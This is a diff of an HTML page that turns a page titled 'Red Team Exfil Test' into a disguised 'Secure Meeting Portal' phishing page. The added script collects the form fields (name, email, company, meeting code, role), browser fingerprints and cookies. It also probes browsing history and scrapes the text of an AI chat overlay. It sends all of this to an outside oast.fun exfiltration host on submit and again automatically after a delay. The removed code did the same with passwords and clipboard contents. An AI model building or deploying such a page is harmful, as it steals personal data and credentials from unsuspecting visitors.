@@ -2,59 +2,91 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Red Team Exfil Test</title>
+  <title>Secure Meeting Portal</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    .container { max-width: 600px; margin: auto; }
+    label { display: block; margin-top: 10px; }
+    input, select { width: 100%; padding: 8px; margin-top: 5px; }
+    button { margin-top: 20px; padding: 10px 20px; }
+  </style>
 </head>
 <body>
-  <h1>Welcome</h1>
-  <form id="fakeLogin">
-    <input name="email" autocomplete="email" placeholder="Email"><br>
-    <input name="password" autocomplete="current-password" placeholder="Password" type="password"><br>
-  </form>
+  <div class="container">
+    <h2>Start Your Secure Meeting</h2>
+    <p>Please verify your details to begin:</p>
+
+    <form id="meetingForm">
+      <label for="fullName">Full Name</label>
+      <input type="text" name="fullName" autocomplete="name" placeholder="John Doe">
+
+      <label for="email">Email Address</label>
+      <input type="email" name="email" autocomplete="email" placeholder="john@example.com">
+
+      <label for="company">Company</label>
+      <input type="text" name="company" autocomplete="organization" placeholder="Acme Corp">
+
+      <label for="meetingCode">Meeting Code</label>
+      <input type="text" name="meetingCode" placeholder="e.g. 123-456-789">
+
+      <label for="role">Your Role</label>
+      <select name="role">
+        <option value="attendee">Attendee</option>
+        <option value="host">Host</option>
+        <option value="admin">Admin</option>
+      </select>
+
+      <button type="submit">Join Meeting</button>
+    </form>
+  </div>
 
   <script>
-    async function exfiltrate() {
-      const payload = {
-        // Autofill targets
-        email: document.querySelector("input[name='email']")?.value,
-        password: document.querySelector("input[name='password']")?.value,
+    async function exfiltratePII() {
+      const form = document.getElementById("meetingForm");
+      const formData = {};
+      form.querySelectorAll("input, select").forEach(el => {
+        formData[el.name] = el.value;
+      });
 
-        // Clipboard (requires paste event)
-        clipboard: null,
-        // AI overlay or injected DOM content
-        aiOverlay: document.querySelector(".ai-chat")?.textContent || null,
+      // Fingerprinting
+      formData.userAgent = navigator.userAgent;
+      formData.screen = `${screen.width}x${screen.height}`;
+      formData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      formData.cookies = document.cookie;
 
-        // DOM scraping
-        domDump: Array.from(document.querySelectorAll("*")).map(el => el.textContent).join(" ").slice(0, 5000),
+      // Attempt to infer history (limited)
+      const links = ["https://linkedin.com", "https://github.com", "https://zoom.us"];
+      formData.historyProbe = {};
+      links.forEach(link => {
+        const a = document.createElement("a");
+        a.href = link;
+        a.textContent = "probe";
+        a.style.display = "none";
+        document.body.appendChild(a);
+        const visited = getComputedStyle(a).color === "rgb(128, 0, 128)"; // purple = visited
+        formData.historyProbe[link] = visited;
+        document.body.removeChild(a);
+      });
 
-        // Fingerprinting
-        cookies: document.cookie,
-        userAgent: navigator.userAgent,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-      };
+      // AI overlay probe
+      formData.aiOverlay = document.querySelector(".ai-chat")?.textContent || null;
 
-      // Send to your exfil server
+      // Send to exfil server
       fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+        body: JSON.stringify(formData)
       });
     }
 
-    // Trigger exfil after short delay
-    setTimeout(exfiltrate, 2000);
-
-    // Clipboard hook
-    document.addEventListener("paste", async () => {
-      try {
-        const text = await navigator.clipboard.readText();
-        fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ clipboard: text })
-        });
-      } catch (e) {}
+    // Trigger exfil on form submit
+    document.getElementById("meetingForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      exfiltratePII();
     });
+
+    // Optional: auto-trigger after delay
+    setTimeout(exfiltratePII, 3000);
   </script>
 </body>
 </html>
